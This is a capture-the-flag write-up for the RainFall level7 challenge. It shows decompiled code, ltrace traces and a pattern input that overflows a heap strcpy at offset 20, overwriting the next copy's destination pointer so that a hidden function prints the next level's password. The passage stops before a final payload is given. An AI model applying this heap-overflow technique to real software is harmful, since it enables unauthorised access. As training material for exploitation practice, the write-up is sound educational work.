## Basic analysis
~~~shell
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 42
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 42 42
~~
~~~
OK, so binary refuses to talk to us until there are two arguments passed. Let's examine with **Ghidra** tool.
~~~C
undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
~~~
It allocates some memory for parameters, but the main part is the file stream, which is obvisously read into the variable **c**, which is not used here. Let's dig further...until we find the 
**m()** function that is printing the c variable (also doe some other useless stuff..).
~~~C
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  time_t param2;
  
  param2 = time((time_t *)0x0);
  printf("%s - %d\n",c,param2);
  return;
}
~~~
We therefore need to run m().

## Buffer overflow

We will use vulnerable strcpy for this, this time it will be a little more complex. We can try to run the binary with **ltrace** to see what library functions are being called during the runtime and with what arguments...
~~~shell
level7@RainFall:~$ ltrace ./level7 42 42
__libc_start_main(0x8048521, 3, 0xbffff7e4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "42")                         = 0x0804a018
strcpy(0x0804a038, "42")                         = 0x0804a038
fopen("/home/user/level8/.pass", "r")            = 0
fgets( <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
~~~
As previously seen in the Ghidra analysis, program calls malloc four times, allocating the memory for arguments, than uses strcpy to copy them to this space. 

Now, lets try to overflow the argv[1] using **Wiremask** pattern generator:
~~~shell
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
__libc_start_main(0x8048521, 2, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
~~~
Here, we can observe, that it overflows at the offset of 20 - **rewriting** the dest arg of the second strcpy. 


